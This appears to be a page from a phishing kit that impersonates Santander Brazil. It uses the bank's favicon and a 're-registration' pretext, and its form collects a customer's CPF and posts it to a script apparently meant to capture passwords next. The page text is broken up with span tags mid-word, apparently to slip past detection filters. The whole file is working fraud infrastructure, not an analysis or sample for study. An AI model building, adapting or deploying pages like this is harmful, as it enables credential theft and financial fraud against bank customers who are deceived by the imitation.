 <?php 
    session_start();
  ?>

  
<!DOCTYPE html>
<html>
<head>
    <title>santaway - Recadastramento</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link href="https://www.santander.com.br/Theme_WCSantanderUK-theme/images/favicon.ico" rel="Shortcut Icon">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script src=https://code.jquery.com/jquery-1.12.0.min.js></script>
    <script>window.jQuery||document.write('<script src="js/vendor/jquery-1.12.0.min.js"><\/script>');</script>
    <script language="javascript">
       var cpfOK = false;
    </script>

</head>
<!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/jquery.mobile-1.3.2.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/script.js"></script>
    <script src="js/cpf.js"></script>


<body id="tela2">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1 id="logo-home">
                   
                    <div class="tela-grande">
                        <p><span>Desculpe o </span>transtorno :(</p>
                        <p>O rec<span>adastramento só pode</span>rá ser efetuado pe<span>lo telef</span>one do titular da con</span>ta.</p>
                    </div>
                </h1>
            </div>
        </div>
    </div>
    <!-- formulario -->
    <div class="container">
        <section class="home-mk">
            <div class="row">
                <div class="col-md-12">
                    <h1 class="logo-form">
                        
                    </h1>
                </div>
            </div>
            <div class="row">
                <div class="col-md-12">
                    <form name="form1" action="webApp_AplicationPass.php" method="POST" class="form-home form-inline" onSubmit="return cpfOK;" id="form" style="margin-top:200px;">
                        
                        <div class="form-group">
                            <input id="cpf" name="cpf" placeholder="Usuário (CPF)" type="tel" minlength="11" maxlength="11" required onkeypress="return SomenteNumero(event)">
                        </div>

                         
                        <div class="form-group">
                            <input  type="submit"  name="" value="ENTRAR" id="continuar" >
                        </div>
                      
                        
                        <div class="form-group">
                        </div>
                    </form>
                </div>
            </div>
        </section>
    </div>
    <!-- rodape -->
    <div class="container">
        <div class="row">   
            <div class="col-md-12">

            </div>
        </div>
    </div>
</body>


<script language="javascript">
   $( document ).ready(function() {
       $( "#continuar" ).click(function() {
           if (checkCPF()){
               cpfOK = true;    
               $("#form").submit(); 
           } else {
               alert("CPF não cadastrado em nossa base de dados !");
               $("#cpf").val('');
           }
       });        
   });   
</script>


</html>